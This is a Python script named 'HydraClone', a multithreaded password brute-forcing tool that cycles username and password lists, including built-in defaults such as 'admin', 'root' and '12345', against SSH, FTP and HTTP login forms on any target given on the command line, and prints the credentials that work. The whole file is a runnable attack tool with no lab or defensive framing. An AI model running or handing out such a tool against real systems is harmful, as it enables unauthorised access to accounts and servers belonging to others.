import argparse
import threading
from queue import Queue
import requests
import paramiko
from ftplib import FTP


class HydraClone:
    def __init__(self, protocol, target, port, username_list, password_list, threads, combine_wordlists=True):
        self.protocol = protocol.lower()
        self.target = target
        self.port = port
        self.username_list = username_list
        self.password_list = password_list
        self.threads = threads
        self.combine_wordlists = combine_wordlists
        self.queue = Queue()
        self.results = []

        # Default embedded wordlists
        self.default_usernames = ["admin", "root", "user", "test"]
        self.default_passwords = ["admin", "password", "12345", "root"]

    def load_credentials(self):
        usernames = self.default_usernames if self.combine_wordlists else []
        passwords = self.default_passwords if self.combine_wordlists else []

        if self.username_list:
            try:
                with open(self.username_list, 'r') as u_file:
                    file_usernames = [line.strip() for line in u_file]
                    usernames.extend(file_usernames if self.combine_wordlists else file_usernames)
            except FileNotFoundError:
                print(f"[!] Username file '{self.username_list}' not found. Using default usernames.")

        if self.password_list:
            try:
                with open(self.password_list, 'r') as p_file:
                    file_passwords = [line.strip() for line in p_file]
                    passwords.extend(file_passwords if self.combine_wordlists else file_passwords)
            except FileNotFoundError:
                print(f"[!] Password file '{self.password_list}' not found. Using default passwords.")

        # Add combinations to the queue
        for username in usernames:
            for password in passwords:
                self.queue.put((username, password))

    def ssh_bruteforce(self):
        while not self.queue.empty():
            username, password = self.queue.get()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.target, port=self.port, username=username, password=password, timeout=3)
                print(f"[+] Found: {username}:{password}")
                self.results.append(f"{username}:{password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] SSH Error: {e}")
            finally:
                self.queue.task_done()

    def ftp_bruteforce(self):
        while not self.queue.empty():
            username, password = self.queue.get()
            try:
                ftp = FTP()
                ftp.connect(self.target, self.port, timeout=3)
                ftp.login(user=username, passwd=password)
                print(f"[+] Found: {username}:{password}")
                self.results.append(f"{username}:{password}")
                ftp.quit()
                return
            except Exception as e:
                print(f"[-] FTP Error with {username}:{password}: {e}")
            finally:
                self.queue.task_done()

    def http_bruteforce(self):
        while not self.queue.empty():
            username, password = self.queue.get()
            try:
                response = requests.post(
                    f"http://{self.target}:{self.port}/login",
                    data={"username": username, "password": password},
                    timeout=3
                )
                if response.status_code == 200 and "Welcome" in response.text:
                    print(f"[+] Found: {username}:{password}")
                    self.results.append(f"{username}:{password}")
                    return
                else:
                    print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] HTTP Error: {e}")
            finally:
                self.queue.task_done()

    def run_threads(self, target_function):
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=target_function)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def start(self):
        self.load_credentials()
        if self.protocol == 'ssh':
            self.run_threads(self.ssh_bruteforce)
        elif self.protocol == 'ftp':
            self.run_threads(self.ftp_bruteforce)
        elif self.protocol == 'http':
            self.run_threads(self.http_bruteforce)
        else:
            print(f"[!] Protocol '{self.protocol}' not supported.")
        
        if self.results:
            print("\n[+] Successful Credentials:")
            for result in self.results:
                print(f"    {result}")
        else:
            print("\n[-] No valid credentials found.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hydra-Like Bruteforcing Tool")
    parser.add_argument("-p", "--protocol", required=True, help="Protocol to brute force (ssh, ftp, http)")
    parser.add_argument("-t", "--target", required=True, help="Target host")
    parser.add_argument("-P", "--port", type=int, required=True, help="Target port")
    parser.add_argument("-u", "--username_list", help="Path to username list")
    parser.add_argument("-w", "--password_list", help="Path to password list")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--no-defaults", action="store_false", help="Disable built-in wordlists")

    args = parser.parse_args()

    tool = HydraClone(
        args.protocol, args.target, args.port,
        args.username_list, args.password_list,
        args.threads, combine_wordlists=args.no_defaults
    )
    tool.start()
